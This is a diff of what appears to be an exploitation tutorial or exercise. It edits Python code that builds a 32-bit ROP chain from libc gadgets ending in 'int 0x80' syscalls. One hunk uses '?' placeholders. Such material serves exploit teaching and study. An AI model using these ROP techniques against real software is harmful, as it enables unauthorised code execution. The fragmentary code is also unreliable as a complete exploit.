@@ -162,7 +162,7 @@ p += pack('<I', 0xffffffff)
 # exit()
 p += pack('<I', xor_eax_addr + base_libcaddr) # xor eax, eax ; ret
 p += pack('<I', inc_eax_addr + base_libcaddr) # inc eax ; ret
-p += pack('<I', int_addr + base_libcaddr) # int 0x80
+p += pack('<I', int_addr ) # int 0x80
 
 # file name string
 p += 'data\0'
@@ -213,7 +213,7 @@ p += pack('<I', 0xffffffff)
 
 p += pack('<I', ? + base_libcaddr) # xor eax, eax ; ret
 p += pack('<I', ? + base_libcaddr) # inc eax ; ret
-p += pack('<I', ? + base_libcaddr) # int 0x80
+p += pack('<I', ? ) # int 0x80
 print(p)
 
 ```
